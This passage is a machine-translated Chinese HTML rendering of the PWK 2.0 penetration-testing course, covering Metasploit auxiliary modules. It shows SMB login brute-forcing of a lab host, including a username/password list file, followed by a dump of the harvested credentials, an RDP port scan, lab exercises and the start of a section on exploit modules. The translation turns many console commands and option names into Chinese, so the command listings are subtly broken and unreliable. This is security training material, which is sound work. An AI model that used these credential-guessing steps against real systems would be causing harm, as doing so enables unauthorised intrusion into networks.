<div style="position:absolute;top:81376;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:81376;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yes 是否打印所有尝试的输出</font></font></nobr></div>
<div style="position:absolute;top:81395;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 750 - smb_login 模块的加载和列出选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示该模块接受</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必需</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和可选</font><font style="vertical-align: inherit;">参数</font></font></nobr></div>
<div style="position:absolute;top:81444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBDomain</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">但是，我们注意到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有设置，即使我们设置了它</font></font></nobr></div>
<div style="position:absolute;top:81464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在使用之前的 smb2 模块时。</font><font style="vertical-align: inherit;">这是因为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只定义了一个参数</font></font></nobr></div>
<div style="position:absolute;top:81483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行模块的范围。</font><font style="vertical-align: inherit;">我们可以改为设置一个全局参数，该参数适用于所有</font></font></nobr></div>
<div style="position:absolute;top:81502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setg</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81564;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们经常为辅助模块更改的一个参数是 THREADS。</font><font style="vertical-align: inherit;">这</font></font></i></nobr></div>
<div style="position:absolute;top:81584;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数告诉框架在运行时启动多少线程</font></font></i></nobr></div>
<div style="position:absolute;top:81603;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，增加并发性和速度。</font><font style="vertical-align: inherit;">我们也不想去</font></font></i></nobr></div>
<div style="position:absolute;top:81622;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个数字很疯狂，但稍微增加会大大减少运行</font></font></i></nobr></div>
<div style="position:absolute;top:81642;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示，我们假设我们已经发现了有效的域凭据</font></font></nobr></div>
<div style="position:absolute;top:81723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的评估过程中。</font><font style="vertical-align: inherit;">我们想确定这些凭据是否可以在其他人身上重复使用</font></font></nobr></div>
<div style="position:absolute;top:81742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 端口 445 打开的服务器。</font><font style="vertical-align: inherit;">为了使事情更容易，我们将在我们的</font></font></nobr></div>
<div style="position:absolute;top:81762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 客户端，以无效密码开头。</font></font></nobr></div>
<div style="position:absolute;top:81794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先提供</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp.com</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的有效域名</font><font style="vertical-align: inherit;">、有效的用户名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无效的</font></font></i></nobr></div>
<div style="position:absolute;top:81814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ABCDEFG123！</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），以及 Windows 10 目标的 IP 地址：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助 (scanner/smb/smb_login) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBDomain corp.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:81866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBDomain =&gt; corp.com</font></font></nobr></div>
<div style="position:absolute;top:81900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBUser Offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:81917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBUser =&gt; Offsec</font></font></nobr></div>
<div style="position:absolute;top:81951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBPass ABCDEFG123！</font></font></font></b></nobr></div>
<div style="position:absolute;top:81968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBPass =&gt; ABCDEFG123！</font></font></nobr></div>
<div style="position:absolute;top:82002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setg RHOSTS 10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:82018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 10.11.0.22 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:82147;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="70"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 70 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:82180;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:83257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:83257;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:83257;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">687</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">设置</font></font></b><font style="vertical-align: inherit;">线程</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font></font></b></nobr></div>
<div style="position:absolute;top:82309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程 =&gt; 10</font></font></nobr></div>
<div style="position:absolute;top:82344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:82377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 10.11.0.22:445 - 启动 SMB 登录暴力破解</font></font></nobr></div>
<div style="position:absolute;top:82394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 10.11.0.22:445 - 此系统不接受身份验证</font></font></nobr></div>
<div style="position:absolute;top:82411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 10.11.0.22:445 - 10.11.0.22:445 -</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">失败：'corp.com\Offsec:ABCDEFG123！' </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></nobr></div>
<div style="position:absolute;top:82428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:82445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:82465;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 751 - 尝试 SMB 登录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们知道我们提供的密码无效，因此登录失败。</font><font style="vertical-align: inherit;">现在，让我们</font></font></nobr></div>
<div style="position:absolute;top:82513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试提供有效的密码并重新运行该模块。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBPass Qwerty09！</font></font></font></b></nobr></div>
<div style="position:absolute;top:82565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBPass =&gt; Qwerty09！</font></font></nobr></div>
<div style="position:absolute;top:82599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:82633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 10.11.0.22:445 - 启动 SMB 登录暴力破解</font></font></nobr></div>
<div style="position:absolute;top:82650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 10.11.0.22:445 - 此系统不接受身份验证</font></font></nobr></div>
<div style="position:absolute;top:82667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22:445 - 10.11.0.22:445 -</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功：'corp.com\Offsec:Qwerty09!' </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理</font></font></nobr></div>
<div style="position:absolute;top:82684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行器</font></font></nobr></div>
<div style="position:absolute;top:82701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:82718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:82737;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 752 - 尝试使用有效凭据进行 SMB 登录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，认证成功。</font><font style="vertical-align: inherit;">我们可以检索有关成功登录的信息</font></font></nobr></div>
<div style="position:absolute;top:82786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的数据库尝试</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds</font></font></font></b></nobr></div>
<div style="position:absolute;top:82838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书</font></font></nobr></div>
<div style="position:absolute;top:82855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">============</font></font></nobr></div>
<div style="position:absolute;top:82889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:82889;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原点服务    </font></font></nobr></div>
<div style="position:absolute;top:82889;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共私人领域 private_typ</font></font></nobr></div>
<div style="position:absolute;top:82906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:82906;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------ -------    </font></font></nobr></div>
<div style="position:absolute;top:82906;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------ ------- ----- -----------</font></font></nobr></div>
<div style="position:absolute;top:82923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 10.11.0.22 445/tcp (microsoft-ds)   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec Qwerty09！</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp.com 密码</font></font></nobr></div>
<div style="position:absolute;top:82942;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 753 - 列出所有发现的凭证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此运行成功，但此方法无法很好地扩展。</font><font style="vertical-align: inherit;">测试更大的用户群</font></font></nobr></div>
<div style="position:absolute;top:82991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种密码，我们可以改为使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USERPASS_FILE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，它指示</font></font></nobr></div>
<div style="position:absolute;top:83010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块使用包含用空格分隔的用户和密码的文件，每行一对。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 USERPASS_FILE /home/kali/users.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:83062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USERPASS_FILE =&gt; /home/kali/users.txt</font></font></nobr></div>
<div style="position:absolute;top:83096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:83130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 10.11.0.22:445 - 启动 SMB 登录暴力破解</font></font></nobr></div>
<div style="position:absolute;top:83147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败：'.\bob:Qwerty09!',</font></font></nobr></div>
<div style="position:absolute;top:83164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败：'.\bob:password'，</font></font></nobr></div>
<div style="position:absolute;top:83181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败：'.\alice:Qwerty09!',</font></font></nobr></div>
<div style="position:absolute;top:83198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败：'.\alice:password'， </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:83335;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="71"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 71 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83368;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:84445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:84445;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:84445;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">688</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22:445 - 10.11.0.22:445 -</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功：'.\offsec:Qwerty09!'</font></font></font></b></nobr></div>
<div style="position:absolute;top:83480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:445 - 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:83497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:83517;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 754 - 使用用户名和密码文件来暴力破解 SMB 登录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试另一个模块。</font><font style="vertical-align: inherit;">在本例中，我们将尝试识别侦听 TCP 端口的机器</font></font></nobr></div>
<div style="position:absolute;top:83566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389，这表明它们可能正在接受远程桌面协议 (RDP) 连接。</font><font style="vertical-align: inherit;">去做</font></font></nobr></div>
<div style="position:absolute;top:83585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样，我们将调用scanner/rdp/rdp_scanner 模块。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用扫描仪/rdp/rdp_scanner</font></font></font></b></nobr></div>
<div style="position:absolute;top:83654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/rdp/rdp_scanner）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:83688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（auxiliary/scanner/rdp/rdp_scanner）：</font></font></nobr></div>
<div style="position:absolute;top:83722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:83739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:83755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CredSSP 真    </font></font></nobr></div>
<div style="position:absolute;top:83755;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 是否申请 CredSSP</font></font></nobr></div>
<div style="position:absolute;top:83772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">早期用户假    </font></font></nobr></div>
<div style="position:absolute;top:83772;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 是否支持较早的用户授权重新</font></font></nobr></div>
<div style="position:absolute;top:83789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:83789;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址范围或 CIDR 标识符</font></font></nobr></div>
<div style="position:absolute;top:83807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告 3389    </font></font></nobr></div>
<div style="position:absolute;top:83807;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标端口 (TCP)</font></font></nobr></div>
<div style="position:absolute;top:83824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程 1    </font></font></nobr></div>
<div style="position:absolute;top:83824;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 并发线程数</font></font></nobr></div>
<div style="position:absolute;top:83840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TLS    </font></font></nobr></div>
<div style="position:absolute;top:83840;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:83840;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 是否要求 TLS 安全</font></font></nobr></div>
<div style="position:absolute;top:83874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/rdp/rdp_scanner）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOSTS 10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:83891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:83925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/rdp/rdp_scanner）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:83959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:3389 -</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.22:3389 上检测到 RDP</font></font></font></b></nobr></div>
<div style="position:absolute;top:83976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:3389 - 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:83993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:84012;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 755 - 识别远程桌面协议端点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此模块成功检测到在一台主机上运行的 RDP 并自动添加结果</font></font></nobr></div>
<div style="position:absolute;top:84061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到数据库。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84096;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 启动 postgresql 服务并启动 msfconsole。</font></font></nobr></div>
<div style="position:absolute;top:84154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 SMB、HTTP 和任何其他有趣的辅助模块来扫描实验室系统。</font></font></nobr></div>
<div style="position:absolute;top:84182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 查看数据库中的主机信息。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.2 利用模块</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经熟悉了基本的 MSF 用法和几个辅助模块，让我们深入挖掘</font></font></nobr></div>
<div style="position:absolute;top:84281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入 MSF 的业务端：利用模块。</font></font></nobr></div>
<div style="position:absolute;top:84313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用模块最常包含易受攻击的应用程序和服务的漏洞利用代码。</font></font></nobr></div>
<div style="position:absolute;top:84333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在撰写本文时，Metasploit 包含 1700 多个漏洞利用，每个漏洞都经过精心设计</font></font></nobr></div>
<div style="position:absolute;top:84352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发和测试以成功利用各种易受攻击的服务。</font><font style="vertical-align: inherit;">这些利用</font></font></nobr></div>
<div style="position:absolute;top:84371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以与辅助模块大致相同的方式调用。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:84523;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="72"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 72 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:84556;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:85633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:85633;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:85633;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">689</font></font></nobr></div>
</span></font>
